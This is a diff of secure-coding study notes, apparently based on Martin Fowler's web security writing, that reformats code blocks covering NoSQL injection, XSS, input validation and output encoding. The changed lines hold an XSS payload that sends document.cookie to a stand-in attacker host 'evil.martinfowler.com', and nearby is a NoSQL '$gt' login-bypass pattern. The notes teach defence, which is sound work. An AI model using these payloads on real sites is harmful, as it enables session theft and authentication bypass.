@@ -522,10 +522,15 @@ var person = {
 		- NoSQL injection:
 			- db.users.find({username: /*{"$gt": ""}*/, password: /*{"$gt": ""}*/});
 	- XSS example: response contains executable script from user input
-		- ```<script>var img = document.createElement(“img”);
-			img.src = ‘http://evil.martinfowler.com/steal?' + document.cookie; </script> ```
+		- ```
+			<script>var img = document.createElement(“img”);
+			img.src = 'http://evil.martinfowler.com/steal?' + document.cookie; 
+			</script> 
+			```
 		- This content is assigned to variable "communicationType" which will be sent by code 
-			```res.send("Can't send by type " + communicationType));```
+			```
+			res.send("Can't send by type " + communicationType));
+			```
 - Input handling:
 	- Positive validation and white-list
 		- email address, valid value range
@@ -535,7 +540,7 @@ var person = {
 		- remove undesirable input rather than reject whole input
 - Output encoding
 	- Unescaped: <script> alert(“hello”);</script>
-	- Escaped: &lt;script&gt;alert(&quot;hello&quot;);&lt;/script&gt;
+	- Escaped: ```&lt;script&gt;alert(&quot;hello&quot;);&lt;/script&gt;```
 		
 		
 		
